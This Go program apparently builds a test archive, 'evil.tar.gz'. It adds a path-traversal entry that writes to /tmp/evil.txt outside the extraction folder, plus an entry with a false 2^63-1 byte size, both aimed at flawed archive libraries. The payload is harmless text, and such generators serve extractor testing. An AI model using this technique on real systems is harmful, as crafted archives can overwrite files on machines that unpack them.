package main

import (
	"archive/tar"
	"compress/gzip"
	"flag"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"time"
)

func main() {
	flag.Parse()
	input := flag.Args()[0]
	output := flag.Args()[1]
	outputName := "evil.tar.gz"
	if input == "" {
		log.Fatalf("must pass a target dir")
	}
	if output == "" {
		log.Fatalf("must pass an output dir")
	}

	out, err := os.Create(filepath.Join(output, outputName))
	if err != nil {
		log.Fatal(err)
	}
	defer out.Close()

	gw, _ := gzip.NewWriterLevel(out, gzip.BestCompression)
	defer gw.Close()
	tw := tar.NewWriter(gw)
	defer tw.Close()

	filepath.Walk(input, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			log.Printf("prevent panic by handling failure accessing a path %q: %v\n", path, err)
			return err
		}
		root := filepath.Dir(input)
		name, err := filepath.Rel(root, path)
		if err != nil {
			log.Fatal(err)
		}
		if info.Mode().IsRegular() {
			f, err := os.Open(path)
			defer f.Close()

			if err != nil {
				log.Fatal(err)
			}
			if err != nil {
				log.Fatal(err)
			}
			hdr := &tar.Header{
				Name:    name,
				Mode:    0777,
				Size:    info.Size(),
				ModTime: info.ModTime(),
			}
			if err := tw.WriteHeader(hdr); err != nil {
				log.Fatal(err)
			}
			data, _ := ioutil.ReadAll(f)
			if _, err := tw.Write(data); err != nil {
				log.Fatal(err)
			}
		}
		return nil
	})

	// Normally, such files are illegal – both GNU tar and BSD tar
	// will complain about the existance of such files.
	// Vulnerable libraries will dutifully extract such a file
	// to where the file specifies according to the relative path
	evilText := []byte("I'm evil!")
	evilHeader := &tar.Header{
		Name:    "../../../../../../../../../tmp/evil.txt",
		Mode:    0777,
		Size:    int64(len(evilText)),
		ModTime: time.Now(),
	}
	if err := tw.WriteHeader(evilHeader); err != nil {
		log.Fatal(err)
	}
	if _, err := tw.Write(evilText); err != nil {
		log.Fatal(err)
	}

	// Some archive handlers don't handle reported large file sizes
	// due to allocating smallint buffers
	longText := []byte("I'm very small!")
	longHeader := &tar.Header{
		Name:    "long_file_is_long.txt",
		Mode:    0777,
		Size:    int64(1<<63 - 1),
		ModTime: time.Now(),
	}
	if err := tw.WriteHeader(longHeader); err != nil {
		log.Fatal(err)
	}
	if _, err := tw.Write(longText); err != nil {
		log.Fatal(err)
	}
}
